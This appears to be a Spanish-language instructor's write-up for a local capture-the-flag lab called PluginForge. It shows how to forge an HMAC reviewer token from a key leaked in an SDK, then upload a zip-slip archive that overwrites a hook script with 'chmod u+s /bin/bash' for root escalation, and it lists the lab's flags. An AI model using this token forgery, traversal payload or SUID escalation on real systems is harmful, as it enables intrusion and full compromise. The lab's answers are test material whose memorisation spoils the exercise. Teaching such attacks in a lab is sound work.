# PluginForge - Writeup tecnico docente

## 1. Idea del laboratorio

PluginForge se resuelve desde la web. No es necesario entrar al contenedor con
`docker exec` ni leer `/root/root.txt` manualmente.

La aplicacion valida el exploit cuando subes un ZIP que demuestra estas condiciones:

- contiene una ruta traversal hacia `../hooks/reindex.sh`;
- el fichero sobrescrito parece un script shell;
- el script contiene una accion compatible con escalada, como `chmod u+s /bin/bash`.

Si esas condiciones se cumplen, la web muestra las flags y permite abrir la pantalla
final con el resumen MITRE ATT&CK.

## 2. Enumeracion

Abrir:

```text
http://127.0.0.1:8082
```

Descargar y revisar el SDK publico:

```powershell
curl http://127.0.0.1:8082/downloads/sdk_example.py -o sdk_example.py
notepad sdk_example.py
```

La evidencia relevante es:

```python
SIGNING_KEY = "PF_REVIEW_HMAC_2026"
```

Esa clave sirve para generar la firma HMAC que acepta el panel de revision.

## 3. Forja de token de revision

El servidor espera una firma HMAC SHA256 sobre el texto `user:role`.

```powershell
python -c "import hmac,hashlib; key=b'PF_REVIEW_HMAC_2026'; msg=b'alice:reviewer'; print(hmac.new(key,msg,hashlib.sha256).hexdigest())"
```

Acceso esperado:

```text
http://127.0.0.1:8082/review?user=alice&role=reviewer&sig=<firma>
```

Si la firma es correcta, el panel de revision permite subir un ZIP.

## 4. Crear el ZIP de explotacion

Crear un ZIP con una ruta traversal:

```powershell
@'
import zipfile

payload = '''#!/bin/bash
chmod u+s /bin/bash
'''

with zipfile.ZipFile('pluginforge_payload.zip', 'w') as zf:
    zf.writestr('../hooks/reindex.sh', payload)

print('pluginforge_payload.zip creado')
'@ | python -
```

Comprobar el contenido real del ZIP:

```powershell
python -c "import zipfile; z=zipfile.ZipFile('pluginforge_payload.zip'); print(z.namelist())"
```

La salida esperada es:

```text
['../hooks/reindex.sh']
```

Nota: el explorador de Windows puede mostrar el ZIP como vacio o no mostrar bien
esa ruta porque contiene `../`. Eso no significa que el ZIP este vacio; significa
que la entrada interna usa una ruta traversal que Windows no representa de forma
normal en la vista grafica.

La ruta `../hooks/reindex.sh` sale del directorio previsto de plugins y apunta al
hook de reindexacion. El contenido `chmod u+s /bin/bash` representa el impacto de
escalada que la web debe detectar.

## 5. Subir el ZIP y cerrar el lab

Subir `pluginforge_payload.zip` desde el panel de revision.

Si el payload es correcto, la web muestra:

- `Payload validado`;
- `DL{pluginforge_user_initial_access}`;
- `DL{pluginforge_root_privilege_escalation}`;
- enlace a la pantalla final ATT&CK.

El laboratorio se considera resuelto cuando aparece la pantalla:

```text
PluginForge completado correctamente
```

## 6. Si no funciona

La pantalla de resultado incluye un checklist. Deben aparecer como correctos:

- Traversal hacia hook;
- Hook ejecutable;
- Impacto privilegiado.

Si alguna comprobacion falla, revisa que el ZIP contenga exactamente:

```text
../hooks/reindex.sh
```

y que el contenido empiece por:

```bash
#!/bin/bash
```

con una accion como:

```bash
chmod u+s /bin/bash
```
